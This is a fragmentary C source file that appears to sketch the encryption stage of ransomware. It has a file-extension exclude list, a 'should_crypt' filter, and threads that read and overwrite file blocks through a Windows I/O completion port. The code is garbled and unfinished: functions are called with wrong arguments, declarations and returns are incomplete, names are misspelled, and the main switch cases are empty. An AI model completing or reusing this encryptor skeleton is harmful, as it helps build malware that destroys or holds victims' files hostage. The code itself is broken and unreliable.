#define OMIT_LENGHT 512
#define SHOULD_OMIT 2048

char *exclude[]={".pdf",".txt"};
HANDLE CompletionPort;
int filesize(char *file)
{
FILE *filep = fopen(file);
fseek(0,filep,SEEK_END);
return 


}
int should_crypt(char *file)
{
for(i=0;i!=sizeof(exclude)/sizeof(char*);i++)
{
if(strstr(file,exclude[i])!=NULL)
{
return 0;
}
}
return 1;
}
bool close_io
bool block_read(overlapped_enc *ovl)
{
LARGE_INTEGER li;
li.QuadPart = (ovl->current_block * BLOCK_SIZE);
ovl->overlapped.Offset = li.LowPart;
ovl->overlapped.OffsetHigh = li.HighPart;
      BOOL res = ReadFile(ovl->file,inpbuff,BLOCK_SIZE,NULL,(LPOVERLAPPED)ovl);
ovl->operation = WRITE;
      PostQueuedCompletionStatus(CompletionPort,0,0, (LPOVERLAPPED)ovl);
      return 0;
}
bool block_write(overlapped_enc *ovl)
{     
    memcpy(ovl->inpbuff,ovl->outbuff,BLOCK_SIZE);
    BOOL res = WriteFile(ovl->file,outbuff,BLOCK_SIZE,NULL,(LPOVERLAPPED)ovl);
ovl->current_block +=1;
    ULONGLONG next_offset = (ovl->current_block * BLOCK_SIZE) + BLOCK_SIZE ;
      
if(next_offset >= ovl->file_size)
{
ovl->operation = HANDLE_EOF;
}
else
{
ovl->operation = READ;
}
  
  PostQueuedCompletionStatus(CompletionPort, 0, 0, (LPOVERLAPPED)ovl);
 return 0;



}
bool handle_eof(overlapped_end *ovl)
{
      memset(ovl->tempbuff,0,sizeof(ovl->tempbuff));
BOOL res = ReadFile(ovl-> file,tempguff,BLOCK_SIZE,NULL,(LPOVERLAPPED)ovl);
ovl->operation = CLOSE_IO;
  PostQueuedCompletionStatus(CompletionPort,0,0,(LPOVERLAPPED)ovl);
}
void crypt(char *key)
{
BOOL result;
DWORD CompletionKey;
overlapped_enc *OverLapped;
LONGLONG offset;
while(1)
  {
result = GetQueuedCompletionStatus(CompletionPort,&NumberOfBytes,CompletionKey,&OverLapped,INFINITE);
switch(OverLapped->operation)
  {
    case WRITE:
 
      
    break;

    case READ:


    break;

    case HANDLE_EOF:



    break;

    case CLOSE_IO:


    break;
  }
  }
}

void crypt_all(char *key)
{
DWORD threads;
HANDLE thread;
  CompletionPort = CreateIoCompletionPort(INVALID_HANDLE_VALUE,0,0,threads)
    if(CompletionPort)
  {
do
  {
thread = CreateThread(0,0,crypt,key,0,0)

threads--
  }
while(threads)
  }

}
